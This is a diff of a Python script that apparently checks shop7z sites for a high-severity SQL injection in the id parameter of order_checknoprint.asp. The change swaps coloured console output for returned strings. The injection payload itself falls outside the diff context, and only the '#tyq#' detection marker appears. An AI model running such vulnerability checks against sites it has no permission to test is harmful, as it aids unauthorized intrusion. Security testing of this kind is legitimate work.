@@ -8,8 +8,8 @@ description: 文件order_checknoprint.asp中,参数id存在SQL注入。
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class shop7z_order_checknoprint_sqli_BaseVerify:
     def __init__(self, url):
@@ -24,12 +24,12 @@ class shop7z_order_checknoprint_sqli_BaseVerify:
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"#tyq#" in req.text:
-                cprint("[+]存在shop7z order_checknoprint.asp SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return "[+]存在shop7z order_checknoprint.asp SQL注入漏洞...(高危)\tpayload: "+vulnurl
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = shop7z_order_checknoprint_sqli_BaseVerify(sys.argv[1])
     testVuln.run()
